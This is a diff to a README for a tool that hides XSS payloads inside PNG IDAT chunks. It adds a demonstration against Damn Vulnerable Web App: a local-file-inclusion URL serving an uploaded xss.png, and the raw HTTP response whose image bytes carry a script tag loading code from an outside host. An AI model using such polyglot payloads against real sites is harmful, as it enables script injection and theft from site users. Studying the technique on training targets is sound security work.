@@ -43,7 +43,26 @@ A simple tool to generate PNG images with XSS payloads stored in PNG IDAT chunks
 000000b2
 ````
 
+#### Damn Vulnerable Web App
 `https://dvwa.capturetheflag.cz/vulnerabilities/fi/?page=../../hackable/uploads/xss.png`
+
+```
+HTTP/1.1 200 OK
+Date: Fri, 23 Aug 2019 00:13:37 GMT
+Content-Type: text/html;charset=utf-8
+Content-Length: 3422
+Connection: close
+
+�PNG
+
+
+IHDR  ���yIDATx�c�<SCRIPT SRC=\\XSS.VAVKAMIL.CZ></SCRIPT> �����=s3��K�_s������?��_�X1��	��~���go4��v�322��Q0
+F�(�`��Q0
+�4�%�۠IEND�B`�
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+```
 
 ### Credits
 
